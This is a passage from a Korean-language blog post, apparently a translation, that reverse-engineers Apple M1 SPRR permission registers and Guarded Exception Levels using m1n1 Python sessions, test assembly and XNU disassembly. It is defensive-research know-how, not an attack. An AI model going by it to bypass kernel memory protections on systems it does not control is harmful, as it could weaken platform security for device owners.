class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>]</code></pre></li></ul><p><code>S3_6_C15_C1_0</code>&#xB97C; <code>SPRR_CONFIG_EL1</code>&#xB85C; &#xCE6D;&#xD558;&#xC790;. &#xADF8; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xBE44;&#xD2B8; 1&#xC740; SPRR&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xACE0; &#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xB97C; &#xC124;&#xC815;&#xD55C; &#xD6C4; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xBCC0;&#xACBD;&#xC744; &#xC704;&#xD574; &#xBAA8;&#xB4E0; SPRR &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC7A0;&#xADF8;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC778;&#xB2E4;. <code>S3_6_C15_1_2</code>&#xACFC; &#xADF8;&#xAC83;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB294; &#xD30C;&#xD2B8; 2&#xC5D0;&#xC11C; &#xC911;&#xC694;&#xD558;&#xB2E4;.</p><p><code>S3_6_C15_C1_5</code>&#xC758; &#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>p.mmu_shutdown()TTY&gt; MMU: shutting down...TTY&gt; MMU: shutdown successful, clearing cache<span class="hljs-meta">&gt;&gt;&gt; </span>u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-number">1</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>))<span class="hljs-number">0x0</span><span class="hljs-meta">&gt;&gt;&gt; </span>u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>), <span class="hljs-number">0xffffffffffffffff</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>))<span class="hljs-number">0xffffffffffffffff</span>&gt;&gt;&gt;</code></pre><p>&#xC774; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; EL0&#xC5D0; &#xC801;&#xC6A9;&#xB418;&#xB294; &#xAC83; &#xAC19;&#xC9C0;&#xB9CC;, &#xC5EC;&#xAE30;&#xC11C;&#xB294; EL2&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;. &#xC0C8;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xB808;&#xC9C0;&#xC2A4;&#xD130; <code>S3_6_C15_C1_6</code>&#xC740; EL1&#xC5D0; &#xB300;&#xD55C; &#xAC83;&#xC774;&#xBA70; <code>S3_6_C15_C1_7</code>&#xC740; EL2&#xC5D0; &#xB300;&#xD55C; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xAC00;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;. M1&#xC740; &#xD56D;&#xC0C1; <code>HCR_EL2.E2H</code>&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xBA70; E1 &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC;&#xC744; EL2 counterparts&#xB85C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158; &#xD55C;&#xB2E4;. &#xC774;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAC00;&#xC815;&#xC744; &#xC99D;&#xBA85;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>), <span class="hljs-number">0xdead0000</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>))<span class="hljs-number">0xdead0000</span>&gt;&gt;&gt;</code></pre><p>SPRR&#xC744; &#xC774;&#xC81C; &#xD65C;&#xC131;&#xD654;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; EL2 &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC83; &#xAC19;&#xC740; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB3C4; &#xC788;&#xB2E4;. &#xC774; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; 4 &#xBE44;&#xD2B8;&#xB97C; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC720;&#xC800; &#xB79C;&#xB4DC;&#xC5D0;&#xC11C; &#xD55C; &#xC2E4;&#xD5D8;&#xC744; &#xD574;&#xBCF4;&#xC790;.</p><h2 id="SPRR-&#xB9AC;&#xBC84;&#xC2A4;-&#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;"><a href="#SPRR-&#xB9AC;&#xBC84;&#xC2A4;-&#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;" class="headerlink" title="SPRR &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;"></a>SPRR &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;</h2><p>&#xAC04;&#xB2E8;&#xD55C; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC124;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD30C;&#xC774;&#xC36C; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD55C; &#xD6C4; &#xC720;&#xC800; &#xB79C;&#xB4DC;&#xC5D0;&#xC11C; &#xD588;&#xB358; &#xAC83;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xC2E4;&#xD5D8;&#xD560; &#xC218; &#xC788;&#xB2E4;. <code>S3_6_C15_C1_6</code>&#xC758; &#xAD8C;&#xD55C; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xB9E4;&#xD551;&#xD558;&#xACE0; &#xD574;&#xB2F9; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xC77D;&#xAE30;, &#xC4F0;&#xAE30;, &#xC2E4;&#xD589;&#xC744; &#xD574;&#xBCF4;&#xC790;.</p><p>&#xD30C;&#xC774;&#xC36C;&#xC5D0;&#xC11C; &#xC774; &#xC791;&#xC5C5;&#xC744; &#xC644;&#xBCBD;&#xD558;&#xAC8C; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC740; <code>r-x</code> &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xC2A4;&#xD0DD;&#xC744; <code>rw-</code> &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC720;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; m1n1&#xC744; &#xBCC0;&#xACBD;&#xD560; &#xB54C;&#xB9CC; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;. &#xD30C;&#xC774;&#xC36C;&#xC5D0;&#xC11C; &#xAC00;&#xB2A5;&#xD55C; &#xB9CE;&#xC740; &#xC124;&#xC815; &#xC791;&#xC5C5;&#xC744; &#xD558;&#xACE0; shellcode&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; &#xB2E4;&#xB978; &#xCF54;&#xC5B4;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774; &#xD6E8;&#xC52C; &#xC27D;&#xB2E4;. &#xD558;&#xB098;&#xAC00; &#xC911;&#xB2E8;&#xB418;&#xB354;&#xB77C;&#xB3C4; &#xC7AC;&#xBD80;&#xD305;&#xC774; &#xB418;&#xAE30; &#xC804;&#xC5D0; &#xB2E4;&#xB978; &#xAC83;&#xC774; &#xB0A8;&#xC544;&#xC788;&#xB2E4;.</p><pre><code class="hljs python">pagetable = ARMPageTable(heap.memalign, heap.free)pagetable.map(<span class="hljs-number">0x800000000</span>, <span class="hljs-number">0x800000000</span>, <span class="hljs-number">0xc00000000</span>, <span class="hljs-number">0</span>)   <span class="hljs-comment"># normal memory, we run from here</span>pagetable.map(<span class="hljs-number">0xf800000000</span>, <span class="hljs-number">0x800000000</span>, <span class="hljs-number">0xc00000000</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># probe memory, we&apos;ll try to read/write/execute this</span><span class="hljs-comment"># ...</span>code_page = build_and_write_code(heap, <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">    // [...]</span><span class="hljs-string">                // prepare and enable MMU</span><span class="hljs-string">                ldr x0, =0x0400ff</span><span class="hljs-string">                msr MAIR_EL1, x0</span><span class="hljs-string">                ldr x0, =0x27510b510 // borrowed from m1n1&apos;s MMU code</span><span class="hljs-string">                msr TCR_EL1, x0</span><span class="hljs-string">                ldr x0, =0x{ttbr:x}</span><span class="hljs-string">                msr TTBR0_EL1, x0</span><span class="hljs-string">                mrs x0, SCTLR_EL1</span><span class="hljs-string">                orr x1, x0, #5</span><span class="hljs-string">                msr SCTLR_EL1, x1</span><span class="hljs-string">                isb</span><span class="hljs-string">    // [...]</span><span class="hljs-string">&quot;&quot;&quot;</span>.format(ttbr=pagetable.l0)<span class="hljs-comment"># ...</span>ret = p.smp_call_sync(<span class="hljs-number">1</span>, code_page, sprr_val)<span class="hljs-comment"># ...</span></code></pre><p>signal handler&#xB294; &#xC774;&#xC81C; exception vector&#xAC00; &#xB41C;&#xB2E4;. &#xB2E8;&#xC77C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC218;&#xC815;&#xD558;&#xC5EC; failure&#xB97C; &#xD45C;&#xC2DC;&#xD55C; &#xD6C4; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xCE74;&#xC6B4;&#xD130;&#xB97C; &#xB450; &#xBC88; &#xC774;&#xB3D9;&#xD55C; &#xD6C4; return &#xD55C;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xB2E4;&#xC2DC; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC2F6;&#xC9C0; &#xC54A;&#xC740; &#xC798;&#xBABB;&#xB41C; &#xBA85;&#xB839;&#xC774;&#xB2E4;. &#xB450; &#xBC88;&#xC9F8;&#xB294; <code>mov x10, 0x80</code>&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xC744; &#xC131;&#xACF5;&#xD588;&#xC74C;&#xC744; &#xD45C;&#xC2DC;&#xD558;&#xBA70; &#xC608;&#xC678;&#xAC00; &#xCC98;&#xB9AC;&#xB420; &#xACBD;&#xC6B0; &#xD45C;&#xC2DC;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;.</p><pre><code class="hljs python">_fault_handler:<span class="hljs-comment"># store that we failed</span>mov x10, <span class="hljs-number">0xf1</span>mrs x12, ELR_GL2  <span class="hljs-comment"># get the PC that faulted</span>add x12, x12, <span class="hljs-number">8</span>   <span class="hljs-comment"># skip two instructions</span>msr ELR_GL2, x12  <span class="hljs-comment"># store the updated PC</span>isb<span class="hljs-comment"># eret restores the state from before the exception was taken</span>eret_sprr_test:<span class="hljs-comment"># ...</span><span class="hljs-comment"># test read access, x1 contains an address to a page for which we modify the SPRR register values</span>mov x10, <span class="hljs-number">0</span>    <span class="hljs-comment"># x10 is our success/failure indicator</span>ldr x1, [x1]  <span class="hljs-comment"># this instruction will fault if we can&apos;t read from [x1]</span>mov x10, <span class="hljs-number">0x80</span> <span class="hljs-comment"># this instruction will be skipped if the previous one faulted</span></code></pre><p>&#xBAA8;&#xB4E0; 16&#xAC1C;&#xC758; &#xAC00;&#xB2A5;&#xD55C; &#xC124;&#xC815;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>&#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;</th><th>&#xD398;&#xC774;&#xC9C0; &#xAD8C;&#xD55C;</th></tr></thead><tbody><tr><td>0000</td><td>&#x2014;-</td></tr><tr><td>0001</td><td>r-x</td></tr><tr><td>0010</td><td>r&#x2014;</td></tr><tr><td>0011</td><td>rw-</td></tr><tr><td>0100</td><td>&#x2014;-</td></tr><tr><td>0101</td><td>r-x</td></tr><tr><td>0110</td><td>r&#x2014;</td></tr><tr><td>0111</td><td>&#x2014;-</td></tr><tr><td>1000</td><td>&#x2014;-</td></tr><tr><td>1001</td><td>&#x2014;x</td></tr><tr><td>1010</td><td>r&#x2014;</td></tr><tr><td>1011</td><td>rw-</td></tr><tr><td>1100</td><td>&#x2014;-</td></tr><tr><td>1101</td><td>r-x</td></tr><tr><td>1110</td><td>r&#x2014;</td></tr><tr><td>1111</td><td>rw-</td></tr></tbody></table></div><p>&#xC5EC;&#xAE30;&#xC5D0; &#xC774;&#xC0C1;&#xD55C; &#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370;, &#xB300;&#xBD80;&#xBD84; &#xD558;&#xC704; &#xB450; &#xBE44;&#xD2B8;&#xAC00; &#xAD8C;&#xD55C;&#xC744; &#xC9C0;&#xC815;&#xD55C;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xB192;&#xC740; &#xBE44;&#xD2B8;&#xAC00; &#xAD8C;&#xD55C;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xC608;&#xC678;&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;. <code>0111</code>&#xC758; &#xACBD;&#xC6B0; <code>rw-</code>&#xAC00; &#xC544;&#xB2CC; <code>---</code> &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C0;&#xACE0;, <code>1001</code>&#xC758; &#xACBD;&#xC6B0; <code>r-x</code>&#xAC00; &#xC544;&#xB2CC; <code>r</code> &#xAD8C;&#xD55C;&#xB9CC;&#xC744; &#xAC00;&#xC9C4;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xC778;&#xCF54;&#xB529;&#xD558;&#xB294;&#xB370; &#xB450; &#xAC1C;&#xC758; &#xBE44;&#xD2B8;&#xAC00; &#xB354; &#xB0AD;&#xBE44;&#xB420; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xB2E4;. &#xC774;&#xAC83;&#xC740; &#xCC98;&#xC74C;&#xC5D0; &#xC4F0;&#xAE30;, &#xC2E4;&#xD589; &#xAD8C;&#xD55C;&#xC744; &#xC5C4;&#xACA9;&#xD558;&#xAC8C; &#xC2DC;&#xD589;&#xD558;&#xB294; &#xC720;&#xC800; vs &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xBCF4;&#xC778;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; EL0&#xC740; &#xB2E4;&#xB978; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C;&#xACE0; &#xC788;&#xB2E4;. &#xADF8;&#xB7FC; &#xC598;&#xB294; &#xBB58;&#xAE4C;?</p><h1 id="Guarded-Exception-Levels-GXF"><a href="#Guarded-Exception-Levels-GXF" class="headerlink" title="Guarded Exception Levels / GXF"></a>Guarded Exception Levels / GXF</h1><p>&#xC704;&#xC5D0;&#xC11C; PPR &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC778;&#xCF54;&#xB529; &#xB41C; &#xC57D;&#xAC04; &#xC774;&#xC0C1;&#xD55C; &#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xB2E4;. normal exception levels&#xACFC;&#xB294; &#xB2E4;&#xB978; <a href="https://twitter.com/s1guza/status/1353749746951839748">guarded exception levels</a>&#xC5D0; &#xB300;&#xD55C; <a href="https://twitter.com/qwertyoruiopz/status/1174787964100075521">&#xBA87; &#xAC00;&#xC9C0;</a> <a href="https://twitter.com/s1guza/status/1355929535699681284">&#xC5B8;&#xAE09;</a>&#xC774; &#xC788;&#xB2E4;. &#xC774;&#xAC83;&#xC740; &#xCEE4;&#xC2A4;&#xD140; &#xBA85;&#xB839;&#xC5B4; <code>0x00201420</code>&#xACFC; <code>0x00201400</code>(<code>genter</code>, <code>gexit</code>)&#xC744; &#xD1B5;&#xD574; &#xD2B8;&#xB9AC;&#xAC70; &#xB41C;&#xB2E4;.</p><p>disassembler&#xB85C; XNU&#xB97C; &#xAC00;&#xC838;&#xAC00;&#xC11C;, <code>otool -xv /System/Library/Kernels/kernel.release.t8101</code>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC0B4;&#xD3B4;&#xBCF4;&#xC790;.</p><pre><code class="hljs apache"><span class="hljs-attribute">fffffe00071f80f0</span>        mov     x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span><span class="hljs-attribute">fffffe00071f80f4</span>        msr     S<span class="hljs-number">3</span>_<span class="hljs-number">6</span>_C<span class="hljs-number">15</span>_C<span class="hljs-number">1</span>_<span class="hljs-number">2</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f80f8</span>        adrp    x<span class="hljs-number">0</span>, <span class="hljs-number">2025</span> ; <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">1000</span><span class="hljs-attribute">fffffe00071f80fc</span>        add     x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">9</span>d<span class="hljs-number">8</span><span class="hljs-attribute">fffffe00071f8100</span>        msr     S<span class="hljs-number">3</span>_<span class="hljs-number">6</span>_C<span class="hljs-number">15</span>_C<span class="hljs-number">8</span>_<span class="hljs-number">2</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f8104</span>        adrp    x<span class="hljs-number">0</span>, <span class="hljs-number">2025</span> ; <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">1000</span><span class="hljs-attribute">fffffe00071f8108</span>        add     x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">9</span>dc<span class="hljs-attribute">fffffe00071f810c</span>        msr     S<span class="hljs-number">3</span>_<span class="hljs-number">6</span>_C<span class="hljs-number">15</span>_C<span class="hljs-number">8</span>_<span class="hljs-number">1</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f8110</span>        isb<span class="hljs-attribute">fffffe00071f8114</span>        mov     x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f8118</span>        msr     ELR_EL<span class="hljs-number">1</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f811c</span>        isb<span class="hljs-attribute">fffffe00071f8120</span>        .long   <span class="hljs-number">0</span>x<span class="hljs-number">00201420</span><span class="hljs-attribute">fffffe00071f8124</span>        ret</code></pre><p>&#xC774;&#xC804;&#xC5D0; &#xCC3E;&#xC740; &#xB450; &#xBC88;&#xC9F8; &#xD65C;&#xC131;&#xD654; &#xB808;&#xC9C0;&#xC2A4;&#xD130; <code>S3_6_C15_C1_2</code>&#xB97C; &#xCC98;&#xC74C; &#xC0AC;&#xC6A9;&#xD55C; &#xD6C4; &#xC54C; &#xC218; &#xC5C6;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xB450; &#xAC1C;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; <code>0x00201420</code>&#xC744; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8; &#xD3EC;&#xC778;&#xD130;&#xB294; &#xBB34;&#xD55C; &#xB8E8;&#xD504;&#xC774;&#xC9C0;&#xB9CC; &#xB450; &#xBC88;&#xC9F8; &#xD3EC;&#xC778;&#xD130;&#xB294; &#xC774;&#xC804;&#xC5D0; &#xD655;&#xC778;&#xD55C; SPRR &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB3C4; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xCE21;&#xB418;&#xB294; &#xD568;&#xC218;&#xB97C; &#xAC00;&#xB9AC;&#xD0A8;&#xB2E4;.</p><p>&#xC544;&#xB9C8;&#xB3C4; <code>S3_6_C15_C8_1</code>&#xC5D0; <code>0x00201420</code>&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC810;&#xD504;&#xD558;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xBA70; <code>0x00201420</code>&#xB294; EL3&#xC5D0; &#xD2B8;&#xB7A9;&#xD558;&#xB294; <code>smc</code>&#xC774;&#xACE0;, <code>0x00201400</code>&#xC740; EL2&#xB85C; &#xB3CC;&#xC544;&#xAC00;&#xB294; <code>eret</code>&#xC778; &#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800; &#xD638;&#xCD9C; &#xBC29;&#xC2DD;&#xACFC; &#xC720;&#xC0AC;&#xD558;&#xB2E4;. &#xC0C8;&#xB85C;&#xC6B4; &#xC2E4;&#xD589; &#xBAA8;&#xB4DC;&#xC5D0; &#xB300;&#xD55C; &#xB2E4;&#xB978; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC774; &#xC5C6;&#xB294; &#xAC83;&#xC774; &#xCC28;&#xC774;&#xC810;&#xC774;&#xB2E4;. SPRR &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC54C;&#xB824;&#xC9C0;&#xC9C0; &#xC54A;&#xC740; 2 &#xBE44;&#xD2B8;&#xAC00; GL2&#xC758; &#xD398;&#xC774;&#xC9C0; &#xAD8C;&#xD55C;&#xC774;&#xBA74; &#xC5B4;&#xB5A8;&#xAE4C;?</p><p>&#xC774;&#xC804;&#xACFC; &#xAC19;&#xC740; &#xC811;&#xADFC;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; m1n1&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; &#xAC80;&#xC99D;&#xC744; &#xD574;&#xBCF4;&#xC558;&#xB2E4;. guarded excution mode&#xC5D0; exception vector&#xB97C; &#xC124;&#xC815;&#xD558;&#xACE0; &#xAC19;&#xC740; &#xC2E4;&#xD5D8;&#xC744; &#xBC18;&#xBCF5;&#xD558;&#xC790;.</p><p><code>VBAR</code>&#xB77C; &#xBD88;&#xB9AC;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC0C8;&#xB85C;&#xC6B4; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; exception vector&#xB97C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;. <code>genter</code> &#xC774;&#xD6C4; XNU&#xAC00; &#xC124;&#xC815;&#xD558;&#xB294; &#xCCAB; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xC911; &#xD558;&#xB098;&#xC778; <code>S3_6_C15_C10_2</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC790;.</p><pre><code class="hljs"><span class="hljs-attribute">fffffe00079e0000</span>        b       <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">15</span>d<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00079e0004</span>        nop<span class="hljs-attribute">fffffe00079e0008</span>        nop<span class="hljs-attribute">fffffe00079e000c</span>        nop[...]<span class="hljs-attribute">fffffe00079e007c</span>        nop<span class="hljs-attribute">fffffe00079e0080</span>        b       <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">1000</span><span class="hljs-attribute">fffffe00079e0084</span>        nop[...]<span class="hljs-attribute">fffffe00079e00fc</span>        nop<span class="hljs-attribute">fffffe00079e0100</span>        b       <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">11</span>f<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00079e0104</span>        nop[...]</code></pre><p><code>S3_6_C15_C10_2</code>&#xAC00; <code>VBAR_GL1</code>&#xC784;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xB294; &#xC608;&#xC678; &#xBCA1;&#xD130; &#xD14C;&#xC774;&#xBE14;&#xB85C; &#xBCF4;&#xC778;&#xB2E4;.</p><p>&#xC774;&#xAC83;&#xC740; &#xC804;&#xCCB4; &#xAD8C;&#xD55C; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xCC3E;&#xB294;&#xB370;&#xC5D0; &#xB3D9;&#xC791;&#xD55C;&#xB2E4;. SPRR &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xAC12;&#xC774; <code>0100</code>, <code>0110</code> &#xD639;&#xC740; <code>1111</code>&#xC778; &#xB3D9;&#xC548;&#xC5D0; EL2&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xB85C; &#xC810;&#xD504;&#xD560; &#xB54C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xB09C;&#xB2E4;. &#xC774; &#xBAA8;&#xB4E0; &#xAC12;&#xB4E4;&#xC740; EL2&#xC5D0;&#xC11C;  &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC; GL2&#xC5D0;&#xC11C;&#xB294; &#xAC00;&#xB2A5;&#xD55C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB098;&#xD0C0;&#xB0B8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xACB0;&#xD568;&#xC740; &#xBA87; &#xAC00;&#xC9C0; &#xC774;&#xC720;&#xB85C; &#xC778;&#xD574; &#xB2E4;&#xB978; &#xC8FC;&#xC18C;&#xB85C; &#xC9C0;&#xC815;&#xB418;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;? &#xC138; &#xAC00;&#xC9C0; &#xACB0;&#xD568;&#xC740; XNU&#xC5D0; &#xBB34;&#xD55C; &#xB8E8;&#xD504;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;.</p><ul><li>EL2&#xAC00; GL2&#xC5D0;&#xC11C;&#xB9CC; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xCF54;&#xB4DC;&#xB85C; &#xC810;&#xD504;&#xD558;&#xB294; &#xACBD;&#xC6B0; <code>S3_6_C15_C8_2</code>&#xB85C; &#xC774;&#xB3D9;(<code>GXF_ABORT_EL2</code>)</li><li>EL2&#xC5D0;&#xC11C;&#xC758; &#xB2E4;&#xB978; &#xC911;&#xB2E8;&#xC740; <code>VBAR_EL2</code>&#xB85C; &#xC774;&#xB3D9;</li><li>GL2&#xC5D0;&#xC11C;&#xC758; &#xB2E4;&#xB978; &#xC911;&#xB2E8;&#xC740; <code>VBAR_GL2</code>&#xB85C; &#xC774;&#xB3D9;</li></ul><p>&#xC774;&#xC81C; SPRR &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xAC00; &#xC804;&#xCCB4; &#xAD8C;&#xD55C; &#xD14C;&#xC774;&#xBE14;&#xB85C; &#xC774;&#xC5B4;&#xC9D0;&#xC744; 